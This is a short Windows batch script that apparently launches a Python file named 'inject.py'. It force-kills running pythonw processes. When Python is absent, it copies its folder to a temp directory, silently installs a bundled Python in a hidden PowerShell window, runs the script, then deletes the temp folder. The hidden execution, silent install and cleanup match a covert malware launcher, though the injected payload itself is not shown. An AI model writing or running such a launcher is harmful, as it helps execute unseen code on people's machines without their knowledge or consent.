@echo off
setlocal EnableDelayedExpansion

set NO_PYTHON=F

python --version 1>NUL 2>NUL
if errorlevel 1 (
    set NO_PYTHON=T
) else (
    for /f "delims=" %%i in ('python -c "import sys; print(int(sys.version_info >= (3, 8)))"') do set PYTHON_VERSION=%%i
    if !PYTHON_VERSION!==0 set NO_PYTHON=T
)

taskkill /IM pythonw.exe /F 2>NUL

set "PS_PY=python inject.py;"

if "%NO_PYTHON%"=="T" (
    reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set FILE=binaries/python-installer.exe || set FILE=binaries/python-installer-amd64.exe
    set "PS_EXE=start $(Join-Path $dest !FILE!) -Args \"/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 InstallLauncherAllUsers=0\" -WindowStyle Hidden -Wait;"
    set "PS_UP_ENV=$Env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User');"
    set "PS_DEST=$dest=(Join-Path ([System.IO.Path]::GetTempPath()) 'H43');"
    set "PS_DEL=Remove-Item $dest -Force  -Recurse -ErrorAction SilentlyContinue;"
    set "PS_DIR=New-Item -Path $dest -ItemType 'directory';"
    set "PS_CPY=Copy-Item -Path '*' -Destination $dest -Recurse -Force;"
    set "PS_CD=cd $dest;"
    set "PS_BACK=cd ..;"

    powershell "!PS_DEST!!PS_DEL!!PS_DIR!!PS_CPY!" 1>NUL
    start "" powershell -WindowStyle hidden "!PS_DEST!!PS_CD!!PS_EXE!!PS_UP_ENV!%PS_PY%!PS_BACK!!PS_DEL!"
) else (
    powershell "%PS_PY%"
)

exit
